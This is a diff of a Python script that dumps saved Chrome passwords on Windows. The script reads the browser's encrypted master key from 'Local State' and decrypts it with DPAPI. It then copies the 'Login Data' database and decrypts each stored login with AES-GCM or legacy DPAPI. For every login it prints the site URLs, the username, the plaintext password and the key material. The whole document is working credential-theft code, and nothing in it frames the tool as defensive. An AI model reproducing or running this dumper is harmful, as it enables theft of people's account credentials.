@@ -2,133 +2,132 @@ import os
 import json
 import base64
 import sqlite3
-import win32crypt
-from Crypto.Cipher import AES
 import shutil
-from datetime import datetime, timedelta
-from binascii import hexlify
+from datetime import datetime
+import win32crypt
+from Cryptodome.Cipher import AES
 
-def get_chrome_datetime(chromedate):
-    """Convert Chrome timestamp to datetime."""
-    if chromedate == 0:
-        return None
-    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+def get_chrome_master_key():
+    """Retrieve and decrypt the AES master key from Chrome's 'Local State'."""
+    local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
+    print(f"[INFO] Reading Local State from: {local_state_path}")
 
-def get_encryption_key():
-    """Extract AES key from Chrome's Local State file."""
+    with open(local_state_path, 'r', encoding='utf-8') as f:
+        local_state = json.load(f)
+
+    encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
+    encrypted_key = base64.b64decode(encrypted_key_b64)
+    # Remove DPAPI prefix "DPAPI" (5 bytes)
+    encrypted_key = encrypted_key[5:]
+    print(f"[DEBUG] Encrypted AES key (hex): {encrypted_key.hex()}")
+
+    # Decrypt AES key using Windows DPAPI
     try:
-        local_state_path = os.path.join(os.environ["USERPROFILE"],
-                                        "AppData", "Local", "Google", "Chrome",
-                                        "User Data", "Local State")
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state = json.load(f)
-        encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
-        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Strip 'DPAPI' prefix
-        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        print(f"[DEBUG] AES Key (hex): {hexlify(decrypted_key).decode()}")
-        return decrypted_key
+        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        print(f"[DEBUG] AES master key (hex): {master_key.hex()}")
+        return master_key
     except Exception as e:
-        print(f"[ERROR] Failed to retrieve encryption key: {e}")
-        return None
+        print(f"[ERROR] Failed to decrypt AES master key: {e}")
+        raise
 
-from binascii import hexlify
+def decrypt_password(ciphertext: bytes, master_key: bytes):
+    """Decrypt Chrome password given ciphertext and master key."""
+    print(f"[DEBUG] Encrypted blob (hex): {ciphertext.hex()}")
 
-def decrypt_password(encrypted_password_blob, key):
-    if not encrypted_password_blob:
-        print("[WARN] Empty password blob.")
-        return "<empty blob>"
+    if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v20'):
+        prefix = ciphertext[:3]
+        print(f"[DEBUG] Prefix: {prefix.decode()} (AES-GCM encrypted)")
+        try:
+            # AES-GCM payload format:
+            # prefix(3) + nonce(12) + ciphertext + tag(16)
+            nonce = ciphertext[3:15]
+            encrypted_pass = ciphertext[15:-16]
+            tag = ciphertext[-16:]
+            print(f"[DEBUG] Nonce (hex): {nonce.hex()}")
+            print(f"[DEBUG] Encrypted data (hex): {encrypted_pass.hex()}")
+            print(f"[DEBUG] Tag (hex): {tag.hex()}")
 
-    blob_hex = hexlify(encrypted_password_blob).decode()
-    print(f"[DEBUG] Encrypted blob (hex): {blob_hex}")
-
-    try:
-        prefix = encrypted_password_blob[:3]
-        if prefix in (b'v10', b'v20'):
-            print(f"[DEBUG] AES-GCM format detected with prefix: {prefix.decode()}")
-
-            iv = encrypted_password_blob[3:15]
-            ciphertext = encrypted_password_blob[15:-16]
-            tag = encrypted_password_blob[-16:]
-
-            print(f"  IV        : {hexlify(iv).decode()}")
-            print(f"  Ciphertext: {hexlify(ciphertext).decode()}")
-            print(f"  Tag       : {hexlify(tag).decode()}")
-            print(f"  AES Key   : {hexlify(key).decode()}")
-
-            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
-            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
-            decoded = decrypted.decode('utf-8')
-            print(f"  Decrypted Password: {decoded}")
-            return decoded
-
-        else:
-            print("[DEBUG] Unknown prefix, trying DPAPI.")
-            decrypted = win32crypt.CryptUnprotectData(encrypted_password_blob, None, None, None, 0)[1]
-            decoded = decrypted.decode('utf-8')
-            print(f"  DPAPI Decrypted Password: {decoded}")
-            return decoded
-
-    except Exception as e:
-        print(f"[ERROR] Decryption failed: {e}")
-        return "<decryption failed>"
-
-
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+            decrypted_pass = cipher.decrypt_and_verify(encrypted_pass, tag)
+            password = decrypted_pass.decode()
+            print(f"[DEBUG] Decrypted password: {password}")
+            return password
+        except Exception as e:
+            print(f"[ERROR] AES-GCM decryption failed: {e}")
+            return "<decryption failed>"
+    else:
+        # Fallback to legacy Windows DPAPI decryption
+        print(f"[DEBUG] Trying legacy DPAPI decryption.")
+        try:
+            decrypted_pass = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
+            if decrypted_pass:
+                password = decrypted_pass.decode()
+                print(f"[DEBUG] DPAPI decrypted password: {password}")
+                return password
+            else:
+                print("[WARN] DPAPI returned empty password.")
+                return "<empty password>"
+        except Exception as e:
+            print(f"[ERROR] DPAPI decryption failed: {e}")
+            return "<decryption failed>"
 
 def main():
-    key = get_encryption_key()
-    if not key:
-        print("[FATAL] Cannot continue without decryption key.")
-        return
+    # Path to Chrome Login Data SQLite database
+    login_data_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
 
-    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                           "Google", "Chrome", "User Data", "Default", "Login Data")
+    # Create a temporary copy to avoid locks
+    tmp_db = "LoginDataTemp.db"
+    shutil.copy2(login_data_path, tmp_db)
 
-    temp_db = "LoginDataTemp.db"
-    try:
-        shutil.copyfile(db_path, temp_db)
-    except Exception as e:
-        print(f"[ERROR] Failed to copy Login Data: {e}")
-        return
+    master_key = get_chrome_master_key()
 
-    try:
-        db = sqlite3.connect(temp_db)
-        cursor = db.cursor()
-        cursor.execute("""
-            SELECT origin_url, action_url, username_value, password_value, 
-                   date_created, date_last_used 
-            FROM logins 
-            ORDER BY date_created
-        """)
-        rows = cursor.fetchall()
+    conn = sqlite3.connect(tmp_db)
+    cursor = conn.cursor()
 
-        if not rows:
-            print("[INFO] No saved passwords found.")
+    cursor.execute('SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins')
 
-        for row in rows:
-            origin_url, action_url, username, encrypted_password, date_created, date_last_used = row
-            decrypted_password = decrypt_password(encrypted_password, key)
+    for row in cursor.fetchall():
+        origin_url, action_url, username, encrypted_password_blob, date_created, date_last_used = row
 
-            print("=" * 60)
-            print(f"Origin URL   : {origin_url}")
-            print(f"Action URL   : {action_url}")
-            print(f"Username     : {username}")
-            print(f"Password     : {decrypted_password}")
-            print(f"Encrypted Hex: {hexlify(encrypted_password).decode()}")
+        print("="*60)
+        print(f"Origin URL   : {origin_url}")
+        print(f"Action URL   : {action_url}")
+        print(f"Username     : {username}")
 
-            if date_created and date_created != 86400000000:
-                print(f"Created      : {get_chrome_datetime(date_created)}")
-            if date_last_used and date_last_used != 86400000000:
-                print(f"Last Used    : {get_chrome_datetime(date_last_used)}")
+        if encrypted_password_blob:
+            password = decrypt_password(encrypted_password_blob, master_key)
+        else:
+            password = "<empty blob>"
 
-    except Exception as e:
-        print(f"[ERROR] Failed to read Login Data DB: {e}")
-    finally:
+        print(f"Password     : {password}")
+        print(f"Encrypted Hex: {encrypted_password_blob.hex() if encrypted_password_blob else ''}")
+
+        # Chrome timestamps are microseconds since 1601-01-01 UTC
+        def chrome_time_to_datetime(chrome_time):
+            if chrome_time:
+                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
+            return None
+
+        # date_created and date_last_used may be None or 0
         try:
-            cursor.close()
-            db.close()
-            os.remove(temp_db)
+            created_dt = chrome_time_to_datetime(date_created)
         except Exception:
-            pass
+            created_dt = None
 
-if __name__ == "__main__":
+        try:
+            last_used_dt = chrome_time_to_datetime(date_last_used)
+        except Exception:
+            last_used_dt = None
+
+        print(f"Created      : {created_dt}")
+        print(f"Last Used    : {last_used_dt}")
+
+    cursor.close()
+    conn.close()
+
+    # Remove temp DB copy
+    os.remove(tmp_db)
+
+if __name__ == '__main__':
+    from datetime import timedelta
     main()
